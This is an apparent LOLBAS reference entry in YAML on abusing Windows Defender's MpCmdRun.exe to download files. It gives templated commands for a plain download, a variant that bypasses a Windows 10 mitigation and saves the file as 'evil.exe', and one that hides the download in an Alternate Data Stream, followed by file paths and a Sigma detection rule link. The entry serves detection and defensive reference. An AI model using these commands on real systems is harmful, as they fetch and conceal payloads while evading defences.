      document_utf8: "---\nName: MpCmdRun.exe\nDescription: Binary part of Windows Defender. Used to manage\
        \ settings in Windows Defender\nAuthor: Oddvar Moe\nCreated: 2020-03-20\nCommands:\n  - Command:\
        \ MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}\n    Description:\
        \ Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)\n\
        \    Usecase: Download file\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n\
        \    OperatingSystem: Windows 10\n  - Command: copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\\
        Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\\
        Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\"\
        \ -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe\n    Description:\
        \ Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path).\
        \ Updated version to bypass Windows 10 mitigation.\n    Usecase: Download file\n    Category:\
        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10\n  - Command:\
        \ MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe\n    Description:\
        \ Download file to machine and store it in Alternate Data Stream\n    Usecase: Hide downloaded\
        \ data into an Alternate Data Stream\n    Category: ADS\n    Privileges: User\n    MitreID: T1564.004\n\
        \    OperatingSystem: Windows 10\nFull_Path:\n  - Path: C:\\ProgramData\\Microsoft\\Windows Defender\\\
        Platform\\4.18.2008.4-0\\MpCmdRun.exe\n  - Path: C:\\ProgramData\\Microsoft\\Windows Defender\\\
        Platform\\4.18.2008.7-0\\MpCmdRun.exe\n  - Path: C:\\ProgramData\\Microsoft\\Windows Defender\\\
        Platform\\4.18.2008.9-0\\MpCmdRun.exe\n  - Path: C:\\Program Files\\Windows Defender\\MpCmdRun.exe\n\
        \  - Path: C:\\Program Files (x86)\\Windows Defender\\MpCmdRun.exe\n  - Path: C:\\ProgramData\\\
        Microsoft\\Windows Defender\\Platform\\4.18.23110.3-0\\X86\\MpCmdRun.exe\nDetection:\n  - Sigma:\
        \ https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml\n\
